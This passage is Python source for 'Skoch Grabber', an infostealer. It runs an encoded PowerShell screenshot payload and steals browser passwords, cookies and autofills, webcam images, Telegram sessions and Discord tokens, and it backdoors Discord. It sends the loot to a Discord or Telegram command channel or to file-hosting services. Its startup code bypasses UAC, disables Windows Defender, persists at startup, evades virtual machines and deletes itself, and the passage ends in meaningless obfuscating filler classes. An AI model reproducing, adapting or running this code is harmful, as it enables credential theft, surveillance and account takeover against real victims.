            command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
            if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                self.ScreenshotTaken = True

    @Errors.Catch
    def BlockSites(self) -> None:
        if Settings.BlockAvSites:
            Logger.info('Blocking AV sites')
            Utility.BlockSites()
            Utility.TaskKill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')

    @Errors.Catch
    def StealBrowserData(self) -> None:
        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
            return
        Logger.info('Stealing browser data')
        threads: list[Thread] = []
        paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
        for name, item in paths.items():
            path, procname = item
            if os.path.isdir(path):

                def run(name, path):
                    try:
                        Utility.TaskKill(procname)
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None
                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
                        if passwords or cookies or history or autofills:
                            os.makedirs(saveToDir, exist_ok=True)
                            if passwords:
                                output = ['URL: {}\nUsername: {}\nPassword: {}'.format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.PasswordsCount += len(passwords)
                            if cookies:
                                output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write('\n'.join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            if history:
                                output = ['URL: {}\nTitle: {}\nVisits: {}'.format(*x) for x in history]
                                with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.HistoryCount += len(history)
                            if autofills:
                                output = '\n'.join(autofills)
                                with open(os.path.join(saveToDir, '{} Autofills.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(output)
                                self.AutofillCount += len(autofills)
                    except Exception:
                        pass
                t = Thread(target=run, args=(name, path))
                t.start()
                threads.append(t)
        for thread in threads:
            thread.join()
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None:
        if Settings.CaptureWebcam:
            camdir = os.path.join(self.TempFolder, 'Webcam')
            os.makedirs(camdir, exist_ok=True)
            camIndex = 0
            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
                camIndex += 1
                self.WebcamPicturesCount += 1
            if self.WebcamPicturesCount == 0:
                shutil.rmtree(camdir)

    @Errors.Catch
    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            Logger.info('Stealing telegram sessions')
            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Telegram')] if x is not None])]
            multiple = len(telegramPaths) > 1
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Telegram')
            if not telegramPaths:
                telegramPaths.append(os.path.join(os.getenv('appdata'), 'Telegram Desktop'))
            for index, telegramPath in enumerate(telegramPaths):
                tDataPath = os.path.join(telegramPath, 'tdata')
                loginPaths = []
                files = []
                dirs = []
                has_key_datas = False
                if os.path.isdir(tDataPath):
                    for item in os.listdir(tDataPath):
                        itempath = os.path.join(tDataPath, item)
                        if item == 'key_datas':
                            has_key_datas = True
                            loginPaths.append(itempath)
                        if os.path.isfile(itempath):
                            files.append(item)
                        else:
                            dirs.append(item)
                    for filename in files:
                        for dirname in dirs:
                            if dirname + 's' == filename:
                                loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
                if has_key_datas and len(loginPaths) - 1 > 0:
                    _saveToDir = saveToDir
                    if multiple:
                        _saveToDir = os.path.join(_saveToDir, 'Profile %d' % (index + 1))
                    os.makedirs(_saveToDir, exist_ok=True)
                    failed = False
                    for loginPath in loginPaths:
                        try:
                            if os.path.isfile(loginPath):
                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
                            else:
                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                        except Exception:
                            shutil.rmtree(_saveToDir)
                            failed = True
                            break
                    if not failed:
                        self.TelegramSessionsCount += int((len(loginPaths) - 1) / 2)
            if self.TelegramSessionsCount and multiple:
                with open(os.path.join(saveToDir, 'Info.txt'), 'w') as file:
                    file.write('Multiple Telegram installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealDiscordTokens(self) -> None:
        if Settings.CaptureDiscordTokens:
            Logger.info('Stealing discord tokens')
            output = list()
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
            accounts = Discord.GetTokens()
            if accounts:
                for item in accounts:
                    USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                    output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                os.makedirs(os.path.join(self.TempFolder, 'Messenger', 'Discord'), exist_ok=True)
                with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                self.DiscordTokensCount += len(accounts)
        if Settings.DiscordInjection and (not Utility.IsInStartup()):
            paths = Discord.InjectJs()
            if paths is not None:
                Logger.info('Injecting backdoor into discord')
                for dir in paths:
                    appname = os.path.basename(dir)
                    Utility.TaskKill(appname)
                    for root, _, files in os.walk(dir):
                        for file in files:
                            if file.lower() == appname.lower() + '.exe':
                                time.sleep(3)
                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                UpdateEXE = os.path.join(dir, 'Update.exe')
                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    def CreateArchive(self) -> tuple[str, str]:
        Logger.info('Creating archive')
        rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'skoch'
                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                if process.returncode == 0:
                    return 'rar'
        shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
        return 'zip'

    def UploadToExternalService(self, path, filename=None) -> str | None:
        if os.path.isfile(path):
            Logger.info('Uploading %s to gofile' % (filename or 'file'))
            with open(path, 'rb') as file:
                fileBytes = file.read()
            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                server = json.loads(http.request('GET', 'https://api.gofile.io/getServer').data.decode(errors='ignore'))['data']['server']
                if server:
                    url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
                    if url:
                        return url
            except Exception:
                try:
                    Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
                    url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
                    return url
                except Exception:
                    Logger.error('Failed to upload to anonfiles')
                    return None

    def SendData(self) -> None:
        Logger.info('Sending data to C2')
        extention = self.CreateArchive()
        if not os.path.isfile(self.ArchivePath):
            raise FileNotFoundError('Failed to create archive')
        filename = 'Skoch-%s.%s' % (os.getlogin(), extention)
        computerName = os.getenv('computername') or 'Unable to get computer name'
        computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
        totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
        uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
        uuid = uuid[1].strip() if len(uuid) >= 1 else 'Unable to detect UUID'
        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
        gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
        gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
            if r.get('status') != 'success':
                raise Exception('Failed')
            data = f'\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}'
            if len(r['reverse']) != 0:
                data += f'\nReverse DNS: {r['reverse']}'
        except Exception:
            ipinfo = '(Unable to get IP info)'
        else:
            ipinfo = data
        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
        grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
        match Settings.C2[0]:
            case 0:
                image_url = 'https://i.pinimg.com/736x/ec/43/75/ec4375c15336ba1e72b0062c515a1d92.jpg'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Skoch Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://dsc.gg/skochworld', 'color': 34303, 'footer': {'text': 'Grabbed by Skoch Grabber | https://dsc.gg/skochworld'}, 'thumbnail': {'url': image_url}}], 'username': 'Skoch Grabber', 'avatar_url': image_url}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['content'] += ' | Archive : %s' % url
                else:
                    fields['file'] = (filename, open(self.ArchivePath, 'rb').read())
                fields['payload_json'] = json.dumps(payload).encode()
                http.request('POST', Settings.C2[1], fields=fields)
            case 1:
                payload = {'caption': f'<b>Skoch Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['text'] = payload['caption'] + '\n\nArchive : %s' % url
                    method = 'sendMessage'
                else:
                    fields['document'] = (filename, open(self.ArchivePath, 'rb').read())
                    method = 'sendDocument'
                token, chat_id = Settings.C2[1].split('$')
                fields.update(payload)
                fields.update({'chat_id': chat_id})
                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
if os.name == 'nt':
    Logger.info('Process started')
    if Settings.HideConsole:
        Syscalls.HideConsole()
    if not Utility.IsAdmin():
        Logger.warning('Admin privileges not available')
        if Utility.GetSelf()[1]:
            if not '--nouacbypass' in sys.argv and Settings.UacBypass:
                Logger.info('Trying to bypass UAC (Application will restart)')
                if Utility.UACbypass():
                    os._exit(0)
                else:
                    Logger.warning('Failed to bypass UAC')
                    if not Utility.IsInStartup(sys.executable):
                        logger.info('Showing UAC prompt')
                        if Utility.UACPrompt(sys.executable):
                            os._exit(0)
            if not Utility.IsInStartup() and (not Settings.UacBypass):
                Logger.info('Showing UAC prompt to user (Application will restart)')
                if Utility.UACPrompt(sys.executable):
                    os._exit(0)
    Logger.info('Trying to create mutex')
    if not Syscalls.CreateMutex(Settings.Mutex):
        Logger.info('Mutex already exists, exiting')
        os._exit(0)
    if Utility.GetSelf()[1]:
        Logger.info('Trying to exclude the file from Windows defender')
        Utility.ExcludeFromDefender()
    Logger.info('Trying to disable defender')
    Utility.DisableDefender()
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.skoch'))):
        try:
            Logger.info('Trying to extract bound file')
            if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
                Logger.info('Old bound file found, removing it')
                os.remove(boundFileDst)
            with open(boundFileSrc, 'rb') as file:
                content = file.read()
            decrypted = zlib.decompress(content[::-1])
            with open(boundFileDst, 'wb') as file:
                file.write(decrypted)
            del content, decrypted
            Logger.info('Trying to exclude bound file from defender')
            Utility.ExcludeFromDefender(boundFileDst)
            Logger.info('Starting bound file')
            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
        try:
            Logger.info('Showing fake error popup')
            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
            icon = int(Settings.FakeError[1][2])
            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if not Settings.Vmprotect or not VmProtect.isVM():
        if Utility.GetSelf()[1]:
            if Settings.Melt and (not Utility.IsInStartup()):
                Logger.info('Hiding the file')
                Utility.HideSelf()
        elif Settings.Melt:
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        try:
            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                Logger.info('Trying to put the file in startup')
                path = Utility.PutInStartup()
                if path is not None:
                    Logger.info('Excluding the file from Windows defender in startup')
                    Utility.ExcludeFromDefender(path)
        except Exception:
            Logger.error('Failed to put the file in startup')
        while True:
            try:
                Logger.info('Checking internet connection')
                if Utility.IsConnectedToInternet():
                    Logger.info('Internet connection available, starting stealer (things will be running in parallel)')
                    SkochGrabber()
                    Logger.info('Stealer finished its work')
                    break
                else:
                    Logger.info('Internet connection not found, retrying in 10 seconds')
                    time.sleep(10)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                Logger.critical(e, exc_info=True)
                Logger.info('There was an error, retrying after 10 minutes')
                time.sleep(600)
        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        Logger.info('Process ended')
class vCbpPtRuTEtXrUk:
    def __init__(self):
        self.__YkrMqEtPXHB()
        self.__GyWjgPaSHpjeUDXfho()
        self.__tBowUEuFYqZqZaT()
        self.__MQdyxYjqweNRiuoi()
        self.__ZcpmovUjxbmVcsY()
        self.__nwhMzofXeMqB()
        self.__KyhFfSVC()
        self.__jnHFDLkwGwysnEOsy()
        self.__hCGZSwHpRMIXVGAPNo()
        self.__LXZmBuzkdYV()
        self.__QwWELDgfNxUqsL()
        self.__JbxkcQmQCC()
        self.__OvuTqoJQpXqGxw()
        self.__xEqFdsysDdfM()
        self.__FkxQBMyu()
    def __YkrMqEtPXHB(self, hgrnPbwkkSjvO, PoMdyiYrWjgKCSrU, SHWzN, tyNPqKYCjQQWQD, iriwpJAyHW, PkOKbDhOyyStPWauy):
        return self.__nwhMzofXeMqB()
    def __GyWjgPaSHpjeUDXfho(self, KKgOtqSLtHPRKsN, XCqIaAonmGVBLCYQfF):
        return self.__YkrMqEtPXHB()
    def __tBowUEuFYqZqZaT(self, BHNzgImSczl, uPexgbVYkxX, DKKgOXmubjUYOqaAPky, BzDsgmDjKeClkDZbCz):
        return self.__jnHFDLkwGwysnEOsy()
    def __MQdyxYjqweNRiuoi(self, MIbYvLWQP, bNasxZwzs, tWAoSXT, slyZTCfJlQjMalicBJ):
        return self.__xEqFdsysDdfM()
    def __ZcpmovUjxbmVcsY(self, eWvGjeKUZRYjyj):
        return self.__JbxkcQmQCC()
    def __nwhMzofXeMqB(self, hNEEJBQEQdzx, SRIMTSW, OSseWoZOjxv, XeYzpmTNQnYHTSZ):
        return self.__QwWELDgfNxUqsL()
    def __KyhFfSVC(self, YAJaTYIeSBKabwa, XGZRtu):
        return self.__OvuTqoJQpXqGxw()
    def __jnHFDLkwGwysnEOsy(self, LXqCkVPDMZitNhMsPg, tejVJBB, QwRim, IyWbcKgucKGa, mzxNVNNGGUhmtVoCAmQS):
        return self.__tBowUEuFYqZqZaT()
    def __hCGZSwHpRMIXVGAPNo(self, GSDEAZQyeM, DwICE, GuEuqfOGmoTqz, FvuQFZtiWtFVnQWF):
        return self.__tBowUEuFYqZqZaT()
    def __LXZmBuzkdYV(self, cpRsCLTWYSo, ZocOr, wRGUETeNF, hiuSBlNMWzgmmrIweuVv, QXNNRWUmymaLFJrS):
        return self.__KyhFfSVC()
    def __QwWELDgfNxUqsL(self, XIgZWfvknLm, qbXiIBStdITc, OjmfPWnAZ, XuthqVf):
        return self.__tBowUEuFYqZqZaT()
    def __JbxkcQmQCC(self, JCsAnMDwoASoNGnefGA, goWXxZ, OwSGPakYAjgd, EPahHfNewSOAfNstJa, mJLZkI, JIPwGsRsgIPELzcK):
        return self.__JbxkcQmQCC()
    def __OvuTqoJQpXqGxw(self, hUGCbezfCH, gVzhycuRGTmWByzMln, ZHRjBEhtTPpd, czaRecI, JdDDPnvuMA, toCvptpiAbWkTri):
        return self.__YkrMqEtPXHB()
    def __xEqFdsysDdfM(self, VdoKVeqCLPdrAfalA, aruRGP, XSrPvpHtvji, fQgpluxxmVYIa, YguZCijI, aobAb, tvZND):
        return self.__tBowUEuFYqZqZaT()
    def __FkxQBMyu(self, tlfBamRwdnnfn, UAqSqbMU, yRECVfeQjzArNZZ, BmrbFSNupG):
        return self.__KyhFfSVC()
class xAwpQQUHkbGwiZ:
    def __init__(self):
        self.__oVqvnZbvwXLcX()
        self.__xYfFrsSCMeKWfvlygU()
        self.__HABFrnpTZOEeWhv()
        self.__xhvGKhqerXUCNwDn()
        self.__EfhubOEItgb()
        self.__GPWGYuZYxYgRHWHfFwHZ()
        self.__IoFicvIsxdemLUdlRGw()
    def __oVqvnZbvwXLcX(self, NhfsdmVILMPClF, UYBrWttzTokXRQeCm, OfZsYrMw, jDhGEMWsQmjdOtl, DYWazxxClZ, plldnblV):
        return self.__IoFicvIsxdemLUdlRGw()
    def __xYfFrsSCMeKWfvlygU(self, eQqOJEtQHS, GXBHWBHXhmAfqEPxuCwG, KNKOYSg, legmVfOyme, ZbgsgeQU):
        return self.__HABFrnpTZOEeWhv()
    def __HABFrnpTZOEeWhv(self, bVyplUGsRkbiIxjekAn, RugGpM, BfnRKvQna, VrzgjYDEkWQUhhb):
        return self.__EfhubOEItgb()
    def __xhvGKhqerXUCNwDn(self, BtLgqbpTe, YeknqkL):
        return self.__xYfFrsSCMeKWfvlygU()
